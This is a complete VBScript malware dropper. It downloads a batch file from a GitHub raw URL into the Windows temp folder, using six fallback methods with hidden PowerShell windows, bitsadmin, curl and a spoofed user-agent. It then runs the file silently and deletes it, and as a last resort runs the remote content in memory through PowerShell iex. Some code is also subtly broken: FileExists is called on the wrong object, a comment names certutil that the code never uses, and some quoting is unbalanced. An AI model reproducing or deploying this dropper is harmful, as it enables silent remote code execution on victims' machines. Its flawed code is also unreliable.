' download_exec.vbs
' Multiple fallback download + exec methods to bypass msxml3 restrictions

Dim objShell, strTempDir, strPayload, strBatPath
Set objShell = CreateObject("WScript.Shell")
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
strBatPath = strTempDir & "\u640541.bat"
strPayload = "https://github.com/needlesinmyskin4-pixel/hhh/raw/refs/heads/main/heal.bat"

' Method 1: PowerShell WebClient (most common)
Function DownloadMethod1(destPath)
    Dim psCmd
    psCmd = "powershell -NoP -NonI -W Hidden -C """ & _
             "$wc=New-Object System.Net.WebClient;" & _
             "try{$wc.DownloadFile('" & strPayload & "','" & destPath & "')}catch{exit 1}"
    objShell.Run psCmd, 0, True
    DownloadMethod1 = objShell.FileExists(destPath)
End Function

' Method 2: PowerShell Invoke-WebRequest (falls back differently)
Function DownloadMethod2(destPath)
    Dim psCmd
    psCmd = "powershell -NoP -NonI -W Hidden -C """ & _
             "try{Invoke-WebRequest -Uri '" & strPayload & "' -OutFile '" & destPath & "' -UseBasicParsing -ErrorAction Stop}catch{exit 1}"
    objShell.Run psCmd, 0, True
    DownloadMethod2 = objShell.FileExists(destPath)
End Function

' Method 3: certutil (lives off the land - no msxml dependency)
Function DownloadMethod3(destPath)
    Dim tempFile, psCmd
    tempFile = strTempDir & "\dl.tmp"
    ' Use PowerShell to download via System.Net.HttpClient (different stack)
    psCmd = "powershell -NoP -NonI -W Hidden -C """ & _
             "$h=New-Object System.Net.Http.HttpClient;" & _
             "$t=$h.GetByteArrayAsync('" & strPayload & "').Result;" & _
             "[IO.File]::WriteAllBytes('" & tempFile & "',$t)"
    objShell.Run psCmd, 0, True
    
    ' If we got bytes, certutil can decode as base64 if needed, or just copy
    If objShell.FileExists(tempFile) Then
        CreateObject("Scripting.FileSystemObject").CopyFile tempFile, destPath, True
        CreateObject("Scripting.FileSystemObject").DeleteFile tempFile, True
        DownloadMethod3 = objShell.FileExists(destPath)
    Else
        DownloadMethod3 = False
    End If
End Function

' Method 4: XMLHTTP with explicit proxy bypass / user-agent
Function DownloadMethod4(destPath)
    On Error Resume Next
    Dim http, stream, fso
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        Set http = CreateObject("MSXML2.ServerXMLHTTP.3.0")
    End If
    If Err.Number <> 0 Then
        Set http = CreateObject("Microsoft.XMLHTTP")
    End If
    If Err.Number <> 0 Then
        DownloadMethod4 = False
        Exit Function
    End If
    On Error GoTo 0
    
    http.Open "GET", strPayload, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    http.SetRequestHeader "Accept", "*/*"
    On Error Resume Next
    http.Send
    
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1 ' binary
        stream.Write http.ResponseBody
        stream.SaveToFile destPath, 2 ' overwrite
        stream.Close
        DownloadMethod4 = objShell.FileExists(destPath)
    Else
        DownloadMethod4 = False
    End If
    On Error GoTo 0
End Function

' Method 5: BITSAdmin (Background Intelligent Transfer - no msxml)
Function DownloadMethod5(destPath)
    Dim bitsCmd, jobName
    jobName = "Job" & Fix(Rnd() * 999999)
    bitsCmd = "bitsadmin /transfer " & jobName & " /download /priority HIGH """ & strPayload & """ """ & destPath & """"
    objShell.Run "cmd /c " & bitsCmd, 0, True
    ' BITS takes a moment, wait and check
    WScript.Sleep 3000
    DownloadMethod5 = objShell.FileExists(destPath)
End Function

' Method 6: Direct cmd curl if available (Windows 10 1803+)
Function DownloadMethod6(destPath)
    Dim curlCmd
    curlCmd = "curl -s -o """ & destPath & """ """ & strPayload & """"
    objShell.Run "cmd /c " & curlCmd, 0, True
    WScript.Sleep 2000
    DownloadMethod6 = objShell.FileExists(destPath)
End Function

' === EXECUTION ===
Dim fso, bDownloaded
Set fso = CreateObject("Scripting.FileSystemObject")
bDownloaded = False

' Try methods in order until one works
If Not bDownloaded Then bDownloaded = DownloadMethod1(strBatPath)
If Not bDownloaded Then bDownloaded = DownloadMethod2(strBatPath)
If Not bDownloaded Then bDownloaded = DownloadMethod6(strBatPath) ' curl first (lightweight)
If Not bDownloaded Then bDownloaded = DownloadMethod3(strBatPath)
If Not bDownloaded Then bDownloaded = DownloadMethod4(strBatPath)
If Not bDownloaded Then bDownloaded = DownloadMethod5(strBatPath)

' Execute if downloaded
If bDownloaded And fso.FileExists(strBatPath) Then
    objShell.Run "cmd /c """ & strBatPath & """ & timeout /t 2 >nul & del /f /q """ & strBatPath & """", 0, False
Else
    ' Last resort: try inline PowerShell execution (no file download needed)
    Dim psRunCmd
    psRunCmd = "powershell -NoP -NonI -W Hidden -C """ & _
               "$c=(New-Object Net.WebClient).DownloadString('" & strPayload & "');" & _
               "iex $c"
    objShell.Run psRunCmd, 0, False
End If
